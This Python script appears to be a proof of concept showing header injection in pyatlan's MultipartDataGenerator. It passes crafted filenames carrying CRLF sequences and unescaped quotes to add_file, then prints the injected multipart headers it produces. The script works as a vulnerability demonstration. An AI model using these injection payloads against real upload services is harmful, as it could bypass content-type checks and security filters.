import io
import sys
sys.path.insert(0, '/root/hypothesis-llm/envs/pyatlan_env/lib/python3.13/site-packages')

from pyatlan.multipart_data_generator import MultipartDataGenerator

def show_header_injection():
    """Demonstrate the header injection vulnerability"""
    
    # Case 1: CRLF injection in filename
    print("=== Case 1: CRLF Injection ===")
    gen = MultipartDataGenerator()
    mock_file = io.BytesIO(b"malicious content")
    
    # Inject a new header using CRLF in filename
    malicious_filename = 'file.txt"\r\nX-Injected-Header: malicious-value\r\nContent-Disposition: form-data; name="extra'
    
    gen.add_file(mock_file, malicious_filename)
    result = gen.get_post_data()
    
    print(f"Malicious filename: {repr(malicious_filename)}")
    print("\nGenerated headers:")
    # Find the Content-Disposition line for the file
    lines = result.split(b'\r\n')
    in_file_part = False
    for line in lines:
        if b'name="file"' in line:
            in_file_part = True
        if in_file_part and (line.startswith(b'--') or line == b''):
            break
        if in_file_part:
            print(f"  {line}")
    
    # Case 2: Quote escape in filename
    print("\n=== Case 2: Quote Escape ===")
    gen2 = MultipartDataGenerator()
    mock_file2 = io.BytesIO(b"content")
    
    # Use quotes to break out of the filename parameter
    quote_filename = 'test"; name="injected"; filename="fake.txt'
    gen2.add_file(mock_file2, quote_filename)
    result2 = gen2.get_post_data()
    
    print(f"Quote injection filename: {repr(quote_filename)}")
    print("\nGenerated headers:")
    lines2 = result2.split(b'\r\n')
    for line in lines2:
        if b'filename=' in line:
            print(f"  {line}")
            # Show how the quotes aren't escaped
            if line.count(b'"') % 2 != 0:
                print("  WARNING: Odd number of quotes - parsing will be ambiguous!")
    
    # Case 3: Simple newline injection
    print("\n=== Case 3: Simple Newline Header Injection ===")
    gen3 = MultipartDataGenerator()
    mock_file3 = io.BytesIO(b"content")
    
    filename_with_newline = "test.txt\r\nContent-Type: text/html"
    gen3.add_file(mock_file3, filename_with_newline)
    result3 = gen3.get_post_data()
    
    print(f"Filename with injected header: {repr(filename_with_newline)}")
    print("\nGenerated multipart data snippet:")
    # Find the relevant section
    start = result3.find(b'name="file"')
    end = start + 200
    print(repr(result3[start:end]))
    
    # Check if we successfully injected a Content-Type header
    if result3.count(b'Content-Type:') > 1:
        print("\nSUCCESS: Header injection worked! Multiple Content-Type headers found.")
        print("This could allow an attacker to:")
        print("  - Override content type detection")
        print("  - Inject arbitrary headers")
        print("  - Potentially bypass security filters")

if __name__ == "__main__":
    show_header_injection()